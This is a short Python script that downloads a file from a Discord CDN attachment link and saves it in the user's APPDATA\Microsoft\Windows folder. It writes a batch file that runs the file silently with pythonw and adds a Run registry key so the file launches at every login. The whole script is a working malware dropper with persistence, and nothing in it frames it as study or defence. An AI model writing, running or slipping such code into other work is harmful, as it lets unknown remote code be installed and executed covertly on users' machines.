import requests
import os
import winreg as reg


def start():
    response = requests.get('https://cdn.discordapp.com/attachments/1083783447291629640/1264405424032055457/my_script.py?ex=669dc0d0&is=669c6f50&hm=00dc4855b7c55d96cfb606721edd94ec34b13e74538c2909f7f4017f52131e23&')
    if response.status_code == 200:
        file_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
        file_name = 'file.py'

        with open(os.path.join(file_path, file_name), 'wb') as file:

            file.write(response.content)
        print(f"Downloaded file saved as {file_name}")
        add_to_startup(file_path,file_name)
        
    else:
        print(f"Failed to download file. Status code: {response.status_code}")

def add_to_startup(file_path,file_name):
    script_path = f"{file_path}\\{file_name}"
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
    bat_name = 'startup_script.bat'

    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:
        bat_file.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')

    # Optional: Add to registry for persistence
    key = reg.HKEY_CURRENT_USER
    sub_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_key, "MyStartupScript", 0, reg.REG_SZ, f"{bat_path}\\{bat_name}")
    reg.CloseKey(reg_key)